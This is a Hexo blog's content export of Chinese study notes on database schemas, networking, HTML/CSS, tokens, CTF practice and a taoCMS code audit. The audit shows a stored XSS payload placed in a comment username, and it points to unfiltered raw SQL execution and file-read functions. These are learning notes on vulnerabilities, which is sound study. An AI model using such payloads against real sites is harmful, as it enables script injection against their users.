{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"https://yzlsjr.github.io","root":"/"},"pages":[],"posts":[{"title":"","slug":"传统数据库与多维表格schema对比","date":"2025-05-25T16:39:30.269Z","updated":"2025-05-26T16:02:55.634Z","comments":true,"path":"2025/05/26/传统数据库与多维表格schema对比/","permalink":"https://yzlsjr.github.io/2025/05/26/%E4%BC%A0%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E5%A4%9A%E7%BB%B4%E8%A1%A8%E6%A0%BCschema%E5%AF%B9%E6%AF%94/","excerpt":"","text":"传统数据库与多维表格Schema设计对比1.传统数据库强结构化 核心逻辑：传统数据库基于关系模型，数据以二维表形式存储，每张表由行（记录）和列（字段）组成。例如，一个电商系统的用户表可能包含用户ID（INT）、用户名（VARCHAR）、注册时间（DATETIME）等字段。 严格数据类型：每列必须预先定义数据类型（如INT、VARCHAR(255)），确保数据的一致性。例如，用户ID必须是整数，用户名必须是字符串，且长度不超过255字符。 目的：通过强制约束（如主键唯一性、外键引用完整性），避免脏数据（如重复用户、无效订单），保障业务逻辑的正确性。 关联性 外键约束：通过FOREIGN KEY定义表间关联（如订单表orders的user_id字段引用用户表users的user_id主键），确保数据一致性。 JOIN操作 通过 1JOIN 查询关联数据（如获取用户及其订单列表）： 123SELECT users.username, orders.order_dateFROM usersJOIN orders ON users.user_id = orders.user_id; 优势：支持复杂事务（如转账操作需同时更新账户余额和交易记录），保障ACID特性（原子性、一致性、隔离性、持久性）。 2. 多维表格半结构化&#x2F;动态模式 动态添加字段：用户可随时新增字段（如为项目管理表添加“优先级”列），无需修改Schema或迁移数据，可直接在表格右侧点击“+”添加新字段。 字段类型灵活切换：字段类型可动态调整（如将“备注”字段从文本改为长文本或附件）。例如，飞书多维表格中可将一个字段从“单选标签”改为“人员选择”。 弱关联性 链接字段：通过选择其他表的记录实现关联（如项目表中的“负责人”字段链接到用户表）。 复杂关联的挑战 多对多关系：需手动创建中间表（如“项目-成员”关联表），而非自动生成。 性能问题：频繁跨表查询可能导致加载延迟（尤其数据量较大时）。 对比传统数据库：传统数据库通过JOIN自动合并关联数据，而多维表格需手动引用并关联。 3.关键差异传统数据库与多维表格的schema关键差异在于多表关联性。 我们先来看传统数据库，以MySQL为例，多表之间通过可以通过join进行数据的关联，支持两个表以上的关联，操作比较简单清晰。 多维表格的数据引用与MySQL中的join操作有相似之处，如下图： 多维表格如果要进行跨表的数据关联就需要使用数据引用字段，两个表以上的关联操作比较复杂，并且在聚合多表时，如果想要聚合一个表的多个字段需要多次使用数据引用字段（数据引用字段一次只能引用另一个表的一个字段），接下来以一个实际案例来进行讲解。 这里我创建了三张表（这里使用的是Navicat可视化），先在MySQL中使用join聚合 1234SELECT test1.*,test2.product,test3.foodFROM test1LEFT JOIN test2 ON test1.id = test2.user_idLEFT JOIN test3 ON test3.user_id = test1.id; 得到查询结果如上图，可以看到由于MySQL一个字段只能储存一个值，所以若有多项匹配会分开显示，不够直观，但是会更严谨规范。 接下来看一下多维表格以飞书为例： 可以看到，我们聚合表二表三需要进行两次数据引用；飞书在字段设计上更灵活，使其可以在一个字段中储存多值，这样对于人来说会更加直观，但是对于计算机来说这样可能会造成一些不必要的麻烦。 4. 关键对比总结 维度 传统数据库 多维表格 数据结构 刚性表结构，严格数据类型 动态字段，字段类型灵活可变 Schema设计 需提前规划，修改成本高 实时调整，无需技术背景 关联性 外键+JOIN，支持复杂事务 链接字段，适合简单关联 查询能力 强大SQL支持，适合数据分析 基础过滤&#x2F;排序，复杂查询依赖API","categories":[],"tags":[]},{"title":"","slug":"MySQL组合提权","date":"2024-12-07T09:00:14.402Z","updated":"2024-12-07T14:37:19.487Z","comments":true,"path":"2024/12/07/MySQL组合提权/","permalink":"https://yzlsjr.github.io/2024/12/07/MySQL%E7%BB%84%E5%90%88%E6%8F%90%E6%9D%83/","excerpt":"","text":"MySQL组合提权记录一次MySQL组合提权漏洞的复现过程 三个权限www-data","categories":[],"tags":[]},{"title":"","slug":"学习记录","date":"2024-12-04T15:53:41.900Z","updated":"2024-12-06T08:23:49.871Z","comments":true,"path":"2024/12/04/学习记录/","permalink":"https://yzlsjr.github.io/2024/12/04/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"学习记录 看到的时候有点懵，找不到突破点，感觉应该是藏在网页代码中，找了一会没什么头绪，看了一下攻略，要传参&#96;&#96;cat&#x3D;dog&#96;再回去网页翻看的时候不经意找到了 在body的结尾，之后看网页代码的时候要分块看，先看整体先不看细节，有条理一些 Warmup1代码审计，页面没有什么可以看的，检查页面代码， source.php 打开看看 还有一个hint.php 打开 flag不在这 substr(string $string , int $start [, int $length ] ) 返回字符串 string 由 start 和 length 参数指定的子字符串。 例：","categories":[],"tags":[]},{"title":"","slug":"Untitled","date":"2024-12-04T04:58:51.514Z","updated":"2024-12-04T04:58:51.624Z","comments":true,"path":"2024/12/04/Untitled/","permalink":"https://yzlsjr.github.io/2024/12/04/Untitled/","excerpt":"","text":"\\","categories":[],"tags":[]},{"title":"网络学习","slug":"网络学习","date":"2024-11-10T14:11:47.415Z","updated":"2024-11-17T06:58:26.940Z","comments":true,"path":"2024/11/10/网络学习/","permalink":"https://yzlsjr.github.io/2024/11/10/%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"网络是怎么连接的浏览器生成信息生成HTTP请求信息URL：Uniform Resource Locator，统一资源定位符。（第一次知道全称😂） HTTP：Hypertext Transfer Protocol，超文本传送协议。 URI：Uniform Resource Identifier，统一资源标识符。URI 的内容是一个存放网页 数据的文件名或者是一个 CGI 程序的文件名。 CGI 程序：对 Web 服务器程序调用其他程序的规则所做的定义就是 CGI，而按照 CGI 规范来工作的程序就称为 CGI 程序。 HTTP定义了客户端和服务器之间交互的消息内容和步骤 客户端向服务端发送请求，包含“对什么”及“进行怎样的操作” 对什么：各种访问目标 进行怎样的操作：GET，POST，DELETE（蕴含可能性，一般不能）…… 生成HTTP请求消息 发送请求后收到响应 当网页中存在图片时，需要再次向Web服务器发送请求 一条消息中只能写一个URI。如果需要获取多个文件，必须对每个文件单独发送1条请求。 向DNS服务器查询Web服务器的IP地址 IP 子网掩码划定IP地址网络号和主机号的分界 IP地址的主机号 全0：表示整个子网 全1：表示向子网上所有设备发送包，即广播 Socket 库是用于调用网络功能的程序组件集合。 根据域名查询 IP 地址时，浏览器会使用 Socket 库中的解析器。调用解析器向DNS服务器查询IP地址。 总结的大致过程控制流程转到解析器——&gt;生成发送给DNS服务器的查询消息（DNS消息是用二进制数据编写的）——&gt;委托操作系统内部的协议栈来执行发送操作（通过网卡将消息发送给DNS服务器） 委托协议栈发送消息 创建套接字 连接管道（connect） 向DNS服务器查询Web服务器的IP地址 DNS服务器查询IP 委托协议栈发给Web服务器 连接在 TCP 模块处创建表示连接控制信息的头部（重点关注双方的端口号） 通过 TCP 头部中的发送方和接收方端口号可以找到要连接的套 接字 确认网络包是否送达，TCP头部设置ACK比特，设置为1时代表已收到网络包 收发数据 协议栈并不是收到数据立马发送，而是会将数据放在缓冲区，积累到一定程度再进行发送，因为应用程序一次发送给协议栈的数据不可控，有差异，可能会导致协议栈发送大量小包，导致网络效率下降。而积累多少数据再发就要看操作系统了。 当从应用程序收到的数据长度超过或者接近 MSS 时再发送出去，就可以避免发送大量小包的问题了。 MTU：一个网络包的最大长度，以太网中一般为 1500 字节。 MSS：除去头部之后，一个网络包所能容纳的 TCP 数据的最大长度。 协议栈的内部有一个计时器，当经过一定时间之后，就会把网络包发送出去(应用程序发送数据频率不高) 实际上，在进行发送操作时要平衡这两者，视操作系统而定。 较大的请求消息，比如要提交表单时，这时要依据MSS长度进行拆分 在发送时会标上序号，用于后续进行拼接数据，在实际通信中不会从1开始，而是用随机数计算出一个初始值，让通信过程不容易被预测。","categories":[],"tags":[]},{"title":"taoCMS学习","slug":"taoCMS部署记录","date":"2024-11-10T14:11:21.546Z","updated":"2024-11-10T14:22:31.912Z","comments":true,"path":"2024/11/10/taoCMS部署记录/","permalink":"https://yzlsjr.github.io/2024/11/10/taoCMS%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/","excerpt":"","text":"taoCMS部署记录准备创建新数据库 创建网站taoCMS，端口与localhost不能冲突，php版本调低（5.4左右） start访问install文件，填写数据库地址端口，数据库名，密码，用户名（数据库名和用户名别填错） install。。。 删除data文件夹下的install.lock文件 访问admin文件，用户名admin，密码tao 进入管理系统 阅读taoCMS代码MVC我先来了解一下MVC，GPT： Model（模型） 负责处理与数据和业务逻辑相关的内容。 从数据库获取数据、处理数据逻辑，并把数据返回给控制器或视图。 例如：在博客应用中，Post模型会负责处理文章的增删改查操作。 View（视图） 负责显示数据和用户界面。 视图从控制器获得数据，通常是呈现成用户能理解的界面（HTML页面）。 例如：在博客应用中，post_view.php 文件可能负责显示单篇文章的内容。 Controller（控制器） 控制器是应用程序的核心，它接收用户请求，调用模型获取数据，然后把数据传递给视图。 例如：在博客应用中，PostController可能会根据用户请求调用Post模型，获取所需文章数据，并传递给post_view来展示。 我们需要一个简单的路由来解析URL请求并调用控制器。 代码阅读（前期自己大致的一些了解，比较粗糙）全局搜索执行SQL，SQL.php中找到$creatTable=Base::magic2word($_POST[&#39;sqltext&#39;]);再搜索magic2word 12345678910static function magic2word($text)&#123; if (is_array($text)) &#123; foreach($text as $k=&gt;$v)&#123; $text[$k]=self::magic2word($v); &#125; &#125;else&#123; $text=stripslashes($text); &#125; return $text;&#125; 将输入的内容去除转义字符 执行SQL功能逻辑 输入SQL语句，输入框限制输入20行 &lt;input name=&quot;action&quot; type=&quot;hidden&quot; value=&quot;sql&quot; /&gt; &lt;input name=&quot;ctrl&quot; type=&quot;hidden&quot; value=&quot;excute&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; id=&quot;submits&quot; value=&quot;执行SQL&quot; /&gt; 123456789101112* 点击按钮，前两句会将输入的内容找到对应执行的模块* ```php function excute()&#123; $creatTable=Base::magic2word($_POST[&#x27;sqltext&#x27;]); $db=new Dbclass(SYS_ROOT.DB_NAME); $o=$db-&gt;query($creatTable); echo&#x27;&lt;pre&gt;&#x27;; print_r($db-&gt;fetch_array($o)); Base::execmsg(&#x27;执行SQL&#x27;,&#x27;?action=sql&amp;ctrl=display&#x27;,$o); &#125; 12345function query($sql)&#123; //echo $sql; $query = $this-&gt;conn-&gt;query($sql); return $query;&#125; 安全过滤 123456789101112131415161718192021222324252627282930313233343536373839404142static function safeword($text,$level=8)&#123; if(is_array($text)) &#123; foreach( $text as $key=&gt;$value)&#123; $safeword[$key]=self::safeword($value); &#125; &#125; else &#123; switch ($level) &#123; case 0: $safeword=$text; break; case 1: $safeword=intval($text); break; case 3: $safeword=strip_tags($text); break; case 5: $safeword=nl2br(htmlspecialchars($text)); break; case 6: $safeword=str_replace(&quot;&#x27;&quot;,&quot;&quot;,addslashes($text)); $safeword=str_replace(&quot;select&quot;,&quot;&quot;,$safeword); $safeword=str_replace(&quot;union&quot;,&quot;&quot;,$safeword); $safeword=str_replace(&quot;=&quot;,&quot;&quot;,$safeword); break; default: if(ucfirst(DB)==&#x27;Sqlite&#x27;)&#123; $safeword=str_replace(&quot;&#x27;&quot;,&quot;&#x27;&#x27;&quot;,$text); &#125; else&#123; $safeword=Base::_addslashs($text); &#125; break; &#125; &#125; return $safeword;&#125; safeword()函数对输入内容进行过滤，并且是分级的，默认分级是8，对不同数据（name，emails等）进行处理时可以进行调整 博客参考（有些混乱，SQL注入漏洞还没有写笔记，还在理解中，后续问题大写问题文档，小就当面问）注意到Model下的File.php提供了文件上传下载的功能，想要利用这个函数需要想到：函数参数是否可控，函数有没有回显 12345function download()&#123; $info=pathinfo($this-&gt;path); header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.$info[&#x27;basename&#x27;].&#x27;&quot;&#x27;); echo file_get_contents($this-&gt;realpath);&#125; 只需要查看file_get_contents()函数参数是否可控 XSS漏洞输入评论的时候，会对我们输入的内容进行过滤， 1name=Base::safeword( Base::safeword($_POST[&#x27;name&#x27;],3),5); 追踪到safeword()函数 123456789101112131415161718192021222324252627282930313233343536373839404142static function safeword($text,$level=8)&#123; if(is_array($text)) &#123; foreach( $text as $key=&gt;$value)&#123; $safeword[$key]=self::safeword($value); &#125; &#125; else &#123; switch ($level) &#123; case 0: $safeword=$text; break; case 1: $safeword=intval($text); break; case 3: $safeword=strip_tags($text); break; case 5: $safeword=nl2br(htmlspecialchars($text)); break; case 6: $safeword=str_replace(&quot;&#x27;&quot;,&quot;&quot;,addslashes($text)); $safeword=str_replace(&quot;select&quot;,&quot;&quot;,$safeword); $safeword=str_replace(&quot;union&quot;,&quot;&quot;,$safeword); $safeword=str_replace(&quot;=&quot;,&quot;&quot;,$safeword); break; default: if(ucfirst(DB)==&#x27;Sqlite&#x27;)&#123; $safeword=str_replace(&quot;&#x27;&quot;,&quot;&#x27;&#x27;&quot;,$text); &#125; else&#123; $safeword=Base::_addslashs($text); &#125; break; &#125; &#125; return $safeword;&#125; strip_tags 去除所有 HTML、XML、PHP 的标签。 htmlspecialchars 把预定义的字符转换成 HTML 实体。 nl2br 把字符串中的 \\n 转换成 \\ 但是忽略了一种情况那就是回复@的时候，过滤不到位 1&lt;a href=&quot;#commentarea&quot; onclick=&quot;return backcomment(&#x27;用户输入的名字&#x27;);&quot;&gt;回复&lt;/a&gt; 观察前端代码追踪backcomment函数 123function backcomment(msg)&#123; $tao(&#x27;comment&#x27;).value=$tao(&#x27;comment&#x27;).value+&quot;@&quot;+msg;&#125; 这里只是简单的进行拼接并没有进行过滤，只是用单引号包裹，所以我们可以这样输入用户名aaa&#39;)+alert(1)+(&#39;，点击回复按钮即可触发XSS。 所以说，在正面针对用户的输入，人们的防护会更严谨更好一些，而侧面以及间接使用的地方（比如在@的时候会引用名字）就会薄弱或者忘记，导致名字被直接拼接，没有被使用。","categories":[],"tags":[]},{"title":"2024秋季招新复盘","slug":"招新复盘","date":"2024-11-03T15:03:31.151Z","updated":"2024-11-03T15:04:25.610Z","comments":true,"path":"2024/11/03/招新复盘/","permalink":"https://yzlsjr.github.io/2024/11/03/%E6%8B%9B%E6%96%B0%E5%A4%8D%E7%9B%98/","excerpt":"","text":"招新复盘笔试方面 出笔试题目时没有一直跟进，上心程度太低 笔试题目没有自己做一遍，导致题目出得有问题，批卷时手忙脚乱 群里考纲没有认真查看，没有考虑到产品同学会看错考纲 面试方面 准备的面试问题少，面试结构及顺序不成体系 第一次面试的时候太紧张，一些问题问不到位（应该先听听学长学姐怎么面试的） 面试的收获 学到了很多关于团队招新人的方向和思考，宁缺毋滥，招新人要符合团队未来方向，新人之后会变成团队的决策者，会极大影响组内接下来的发展和方向 新人的态度和责任感是很重要的，关乎接下来一届一届实验室的发展 面试的技巧：比如一个面试人员如何把控好整体面试的节奏，如何灵活的提出一些问题；如果面试者的笔试试题做的并不好，留白很多，我们如何将这个话题提出： 你觉得你的笔试题目做的如何？ Yes（那他就很有问题） NO——为什么做的不好？留白or其他——回答留白我们就可以继续了解为什么这样及是怎么准备的，从而我们可以看出更多的，比如他的态度，做事风格。 面试大体流程： 进行自我介绍 请他进行介绍 询问参与社团情况 未来规划 技术方面的了解：包括笔试题目，各技术方向的了解 判断个人能力：问一些遇到困难的事情时的做法，或者计算机语言方面的问题，指针有什么好处，某某算法的逻辑。如果没有基础可以对逻辑题或者团队协作的问题进行提问。 了解责任感，在团队中可能遇到的一些问题可以向他提出来，了解他的处理方法。 面试还是要营造轻松一些的氛围，但不能显得不正式，我们要把握好这个度，让我们可以看出他的一些闪光点，潜力点或是不足，面试官是要引导面试者说出他的一些闪光点而不是一味的给予压力，那么我们有时也会得不到我们想要的新人 总之，面试这个过程也是门大学问不仅仅是对面试者的选拔，也是对面试官的考验，优秀的面试官应该有能力选出最符合团队发展的新成员。","categories":[],"tags":[]},{"title":"HTML学习","slug":"HTML学习笔记","date":"2024-11-03T10:35:55.800Z","updated":"2024-11-03T10:37:04.429Z","comments":true,"path":"2024/11/03/HTML学习笔记/","permalink":"https://yzlsjr.github.io/2024/11/03/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"一.标签语法 双标签：&lt;开始标签&gt;文本内容&lt;&#x2F;结束标签&gt; 结束标签多了一个**&#x2F;** 单标签：无结束标签 如&lt;br&gt;:换行 &lt;hr&gt;:水平线 二.HTML骨架12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;网页标题&lt;/title&gt; &lt;/head&gt; &lt;body&gt; 网页主体 &lt;/body&gt;&lt;/html&gt; vs code中快速生成骨架,!(英文)加Enter&#x2F;Tab键 三.标签关系 父子关系 并列关系 四.注释1&lt;!--注释内容--&gt; 添加或删除的快捷键：Ctrl + &#x2F; 五.各类标签1.标题标签h1~h6 12&lt;h1&gt;一级标题&lt;/h1&gt;&lt;h2&gt;二级标题&lt;/h2&gt; h1在一个网页中只能用一次 2.段落标签标签名：p(双标签) 3.换行与水平标签 换行：&lt;br&gt;(单标签) 水平线：&lt;hr&gt; 4.文本格式化标签 标签名 效果 strong 加粗 em 倾斜 ins 下划线 del 删除线 5.图片标签语法：&lt;img src&#x3D;”图片的URL”&gt; 属性 作用 说明 alt 替换文本 图片不显示的时候显示文字 title 提示文本 鼠标悬停在图片上的时候显示的文字 width 图片的宽度 值为数字，无单位 height 图片的高度 值为数字，无单位 6.音频标签1&lt;audio src=&quot;音频的URL&quot;&gt;&lt;/audio&gt; 属性 作用 特殊说明 src（必须属性） 音频URL 支持格式：MP3，Ogg，Wav controls 显示音频控制面板 直接写名 loop 循环播放 直接写名 autoplay 自动播放 直接写名（浏览器一般会禁用自动播放功能） 7.视频标签1&lt;video src=&quot;视频的URL&quot;&gt;&lt;/video&gt; 常见属性 属性 作用 特殊说明 src（必须属性） 视频URL 支持格式：MP4，Ogg，WebM controls 显示视频控制面板 loop 循环播放 muted 静音播放 autoplay 自动播放 浏览器支持在静音状态自动播放 8.列表标签 无序列表 ul嵌套li，ul为无序列表，li是列表条目 1234&lt;ul&gt; &lt;li&gt;第一项&lt;/li&gt; &lt;li&gt;第二项&lt;/li&gt;&lt;/ul&gt; 有序列表 ol嵌套li，ol为有序列表，li是列表条目 1234&lt;ol&gt; &lt;li&gt;第一项&lt;/li&gt; &lt;li&gt;第二项&lt;/li&gt;&lt;/ol&gt; ol标签里只能包括li标签 li标签里包括任何内容 定义列表 dl嵌套dt和dd，dl是定义列表，dt是定义列表的标题，dd是定义列表的描述&#x2F;详情 12345&lt;dl&gt; &lt;dt&gt;列表标题&lt;/dt&gt; &lt;dd&gt;列表描述/详情&lt;/dd&gt; &lt;dd&gt;列表描述/详情&lt;/dd&gt;&lt;/dl&gt; dl标签里只能包括dt和dd dt和dd标签里包括任何内容 9.表格标签 table嵌套tr，tr嵌套td&#x2F;th 标签名 说明 table 表格 tr 行 th 表头单元格 td 内容单元格 使用border属性可为表格添加边框线 1&lt;table border=&quot;1&quot;&gt; border表格线粗细 表格结构标签（了解） 标签名 含义 特殊说明 thead 表格头部 表格头部内容 tbody 表格主体 主要内容区域 tfoot 表格底部 汇总信息区域 合并单元格 将多个单元格合并成一个单元格，以合并同类信息 步骤 明确合并目标 保留最左最上的单元格，添加属性（取值是数字，表示需要合并的单元格数量） 跨行合并，保留最上单元格，添加属性rowspan 跨列合并，保留最左单元格，添加属性colspan 1&lt;td colspan=&quot;3&quot;&gt;第一&lt;/td&gt; 10.input标签1&lt;input type=&quot;...&quot;&gt; type属性值 说明 text 文本框，输入单行文本 password 密码框 radio 单选框 checkbox 多选框 file 上传文件 占位文本：提示信息 1&lt;input type=&quot;...&quot; placeholder=&quot;提示信息&quot;&gt; 单选框radio 属性名 作用 特殊说明 name 控件名称 （name&#x3D;”自定义”）控件分组，同组只能选中一个（单选功能） checked 默认选中 属性名和属性值相同，简写为一个单词 上传多个文件 1&lt;input type=&quot;file&quot; multiple&gt; 多选框默认选中：checked 1&lt;input type=&quot;checkbox&quot; checked&gt; 11.按钮标签1&lt;button type=&quot;&quot;&gt;按钮&lt;/button&gt; type属性值： type属性值 说明 submit 提交按钮，提交数据到后台 reset 重置按钮，将表单控件恢复默认 button 普通按钮，默认没有功能 与form标签一起用，将这一区域数据整体发送给后台action是未来发送数据的地址 123&lt;form action=&quot;&quot;&gt; 内容&lt;/form&gt; 六.路径 相对路径 . 当前文件所在文件夹 .. 当前文件上一级文件夹 绝对路径 从盘符出发 &#x2F; 进入某个文件夹里 七.超链接语法： 1&lt;a href=&quot;https://www.baidu.com/&quot;&gt;跳转到百度&lt;/a&gt; 1&lt;a href=&quot;https://www.baidu.com/&quot; target=&quot;_blank&quot;&gt;跳转到百度&lt;/a&gt; target=&quot;_blank&quot;会在新窗口打开 在开发初期不知道链接跳转地址，herf属性值写#，表示空链接，不会跳转 网页制作思路：从上到下，先整体后局部，逐步分析制作 八.下拉菜单标签：select嵌套option，select是下拉菜单整体，option是下拉菜单的每一项。 1234&lt;select&gt; &lt;option&gt;北京&lt;/option&gt; &lt;option&gt;武汉&lt;/option&gt;&lt;/select&gt; 默认属性：selected 九.文本域作用：多行输入文本 标签： 1&lt;textarea pleaseholder=&quot;背景文字&quot;&gt;（不是背景文字）请输入文字&lt;/textarea&gt; 十.label标签用label标签绑定文字与表单控件的关系，增大表单控件的点击范围（支持很多） 写法一 label标签只包裹内容，不包裹表单控件 设置label标签的for属性值和表单控件的id属性值相同 12&lt;input type=&quot;radio&quot; id=&quot;man&quot;&gt;&lt;label for=&quot;man&quot;&gt;男&lt;/label&gt; 写法二 &lt;label&gt;&lt;input type=&quot;radio&quot;&gt;女&lt;/label&gt; 12345678# 十一.无语义的布局标签作用：布局网页，划分网页区域，摆放内容```html&lt;div&gt;div标签，独占一行&lt;/div&gt;&lt;span&gt;span标签，不换行&lt;/span&gt; 十二.字符实体 显示结果 描述 实体名称 空格 &amp;nbsp; &lt; 小于号 &amp;lt; &gt; 大于号 &amp;gt;","categories":[],"tags":[]},{"title":"CSS的学习","slug":"CSS学习笔记","date":"2024-11-03T10:32:00.976Z","updated":"2024-11-03T10:35:41.095Z","comments":true,"path":"2024/11/03/CSS学习笔记/","permalink":"https://yzlsjr.github.io/2024/11/03/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"一.CSS简介书写位置：title标签下方添加style双标签，style标签里面书写css代码 注释：/* */ 写法：选择器{CSS 属性} 12345678&lt;style&gt; p&#123; /*文字颜色*/ color:red; /*字号*/ font-size:30px; &#125;&lt;/style&gt; 二.CSS引入方式 内部样式表：见一 外部样式表： CSS代码写在单独文件中 在HTML使用link标签引入 1&lt;link rel=&quot;stylesheet&quot;href=&quot;引入文件地址&quot;&gt; 行内样式：配合JavaScript使用 CSS写在标签的style属性值里 1&lt;div style=&quot;color:red; font-size:30px;&quot;&gt;这是div标签&lt;/div&gt; 三.选择器标签选择器：使用标签名作为选择器，无差异化 类选择器：差异化设置标签的显示效果 步骤： 定义类选择器—&gt;.类名 使用类选择器—-&gt;标签添加class&#x3D;”类名” 12345678910&lt;style&gt; .red&#123; color:red; &#125; .size&#123; font-size:20px; &#125;&lt;/style&gt;&lt;div class=&quot;red size&quot;&gt;这是div标签&lt;/div&gt;/*一个标签可以使用多个类名*/ id选择器定义id选择器：#id名{···} 使用时，标签名添加id&#x3D;”id名” 同一个id标签一个页面只能用一次 通配符选择器1*&#123;color:red;&#125; 查找页面所有标签，设置相同样式，不需要调用 画盒子 属性名 作用 width 宽度 height 高度 background-color 背景色 文字控制属性 描述 属性 字体 font-size 字体粗细 font-weight 字体倾斜 font-style 行高 line-height 字体族 font-family 字体复合属性 font 文本缩进 text-indent 文本对齐 text-align 修饰线 text-decoration 颜色 color font-weight 加粗 700（bold） 正常 400（normal） font-style属性值 正常:normal 倾斜：italic 行高由上间距，文本高度，下间距组成 若行高值是数字，则表示当前标签字体大小的倍数 垂直居中技巧 盒子高度属性与文字行高相同（只适用于单行文字） font-family属性值 字体名 sans-serif（无衬线字体） font font：是否倾斜 是否加粗 字号&#x2F;行高 字体（必须按顺序写） &#x3D;&#x3D;注&#x3D;&#x3D;：字号字体值必须写否则font属性不生效 text-indent属性值 数字+px 数字+em（推荐：1em&#x3D;当前标签字号大小） text-align（本质：居中的是文字不是标签 ，要有父级标签） 属性值 效果 left 左对齐（默认） center 居中 right 右对齐 text-decoration 属性值 效果 none 无 underline 下划线 line-through 删除线 overline 上划线 颜色rgba写法 rgba(r,g,b,a)a表示透明度，取值：0-1 复合选择器后代选择器(所有后代及后代的后代)写法：父选择器 子选择器{CSS属性} 子代选择器写法：父选择器&gt; 子选择器{CSS属性} 并集选择器选中多组标签设置相同的样式 写法：选择器1，选择器2，···，选择器n{CSS属性} 交集选择器 选中同时满足多种条件的元素 写法：选择器1选择器2{CSS属性}，选择器之间无符号 如果交集选择器中有标签选择器，标签选择器必须书写在最前面。 伪类（状态）选择器写法： 鼠标悬停状态：选择器：hover{CSS属性} 超链接 选择器 作用 ：link 访问前 ：visited 访问后 ：hover 鼠标悬停 ：active 点击时 要设置多个的话顺序：lvha CSS特性 继承性 子级继承父级的文字属性 如果标签自己有样式则生效自己的样式 层叠性 相同属性会覆盖 不同的属性会叠加 优先级 一个标签使用多个选择器时，匹配规则，比如用不同选择器给一个标签添加颜色，该听谁的 通配符选择器&lt;标签选择器&lt;类选择器&lt;id选择器&lt;行内样式&lt;!important (选中标签范围越大，优先级越低) 叠加计算（复合选择器）规则 叠加计算：如果是复合选择器，则需要权重叠加计算。 公式: (每一级之间不存在进位)(行内样式，id选择器个数，类选择器个数，标签选择器个数)规则:从左向右依次比较选个数，同一级个数多的优先级高，如果个数相同，则向后比较 ！important权重最高 继承权重最低 html简写 类选择器：标签名.类名（div标签更简单，直接.类名） id选择器：标签名#类名 同级标签：div+p 父子级标签：div&gt;p 多个相同标签：标签*个数 有内容标签：标签名{内容} CSS简写 首字母 多个用加号 背景属性 描述 属性 背景色 background-color 背景图 background-image 背景图平铺方式 background-repeat 背景图位置 background-position 背景图缩放 background-size 背景图固定 background-attachment 背景复合属性 background 背景图默认平铺（复制）效果 属性值 效果 no-repeat 不平铺 repeat 平铺（默认） repeat-x 水平方向平铺 repeat-y 垂直方向平铺 背景图位置 关键字 位置 left 左侧 center 居中 right 右侧 top 顶部 bottom 底部 坐标（数字+px，正负都可以） 提示： 关键字取值方式写法可以颠倒取值顺序 可以只写一个关键字，另一个方向默认居中，数字只写一个值表示水平方向，垂直方向居中 背景图缩放:background-size 关键字 cover：等比例缩放背景图片以完全覆盖背景区，可能背景图片部分看不见 contain：等比例缩放背景图片以完全装入背景区，可能背景区部分空白 百分比：根据盒子尺寸计算图片大小 背景图固定 属性名：background-attchment 属性值：fixed 背景图复合 属性值：背景色 背景图 背景平铺方式 背景图位置**&#x2F;**背景图缩放（前用斜杠） 显示模式 块级元素 独占一行 宽度默认是父级的100% 添加宽高属性生效 行内元素 一行共存多个 尺寸由内容撑开 加宽高不生效 行内块元素 一行共存多个 默认尺寸由内容撑开 宽高属性生效 转换显示模式 属性名：display 属性值 效果 block 块级 inline-block 行内块 inline 行内","categories":[],"tags":[]},{"title":"Token","slug":"Token","date":"2024-11-03T10:27:36.390Z","updated":"2024-11-03T10:30:13.808Z","comments":true,"path":"2024/11/03/Token/","permalink":"https://yzlsjr.github.io/2024/11/03/Token/","excerpt":"","text":"Token什么是Token?token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。 当用户第一次登录后，服务器生成一个token并将此token返回给客户端，以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。 简单token的组成；uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token的前几位以哈希算法压缩成的一定长度的十六进制字符串。为防止token泄露） Token 的生成过程： 选择加密算法和密钥：首先，选择合适的加密算法和密钥来生成 Token。常见的算法包括 HMAC 和基于公钥&#x2F;私钥的算法（如 RSA）等。示例选择使用 HMAC-SHA256 算法，并准备好一个密钥。 生成载荷（Payload）：载荷是 Token 中包含的信息，通常包括用户的身份、权限、过期时间等。我们可以用 JSON 格式来表示载荷。示例载荷如下： 12345&#123; &quot;user_id&quot;: &quot;123456&quot;, &quot;username&quot;: &quot;example_user&quot;, &quot;expires_at&quot;: &quot;2024-03-31T00:00:00Z&quot;&#125; 生成签名（Signature）：使用选定的加密算法和密钥，对载荷进行签名。签名是载荷和密钥的哈希值，用于验证令牌的完整性和真实性。示例中使用 HMAC-SHA256 算法来生成签名。 将载荷和签名组合成令牌：将生成的签名与载荷组合起来，形成最终的令牌。令牌通常以**”.”**分隔载荷和签名。 Token 的校验过程： 提取载荷和签名：在接收到令牌后，首先提取载荷和签名。 验证签名：使用与生成令牌时相同的密钥和加密算法，对载荷进行哈希，并将结果与令牌中的签名进行比较。如果匹配，则令牌未被篡改。 检查有效期：如果令牌中包含了过期时间，需要验证当前时间是否在有效期范围内。 基于token机制的身份认证使用token机制的身份验证方法，在服务器端不需要存储用户的登录记录。大概的流程： 客户端使用用户名和密码请求登录。 服务端收到请求，验证用户名和密码。 验证成功后，服务端会生成一个token，然后把这个token发送给客户端。 客户端收到token后把它存储起来，可以放在cookie或者Local Storage（本地存储）里。 客户端每次向服务端发送请求的时候都需要带上服务端发给的token。 服务端收到请求，然后去验证客户端请求里面带着token，如果验证成功，就向客户端返回请求的数据。(如果这个 Token 在服务端持久化（比如存入数据库），那它就是一个永久的身份令牌。)","categories":[],"tags":[]},{"title":"Python MySQL交互","slug":"Python MySQL交互","date":"2024-11-03T04:37:42.103Z","updated":"2024-11-03T04:38:50.581Z","comments":true,"path":"2024/11/03/Python 